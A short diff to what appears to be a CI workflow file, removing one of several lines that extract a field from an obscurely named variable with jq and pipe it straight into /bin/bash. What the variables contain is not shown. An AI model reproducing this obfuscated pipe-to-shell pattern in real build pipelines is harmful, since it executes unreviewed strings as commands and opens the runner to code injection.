@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$gwpno90" | jq -r .slaos1309 | /bin/bash
           echo $bh33946 | jq -r .ctq149 | /bin/bash
           printf '%s' "$zek14064" | jq -r .ou963 | /bin/bash
-          echo $drqtw3 | jq -r .li359 | /bin/bash
           echo $leuho69 | jq -r .eadq0328 | /bin/bash
 
       - name: Store artifact
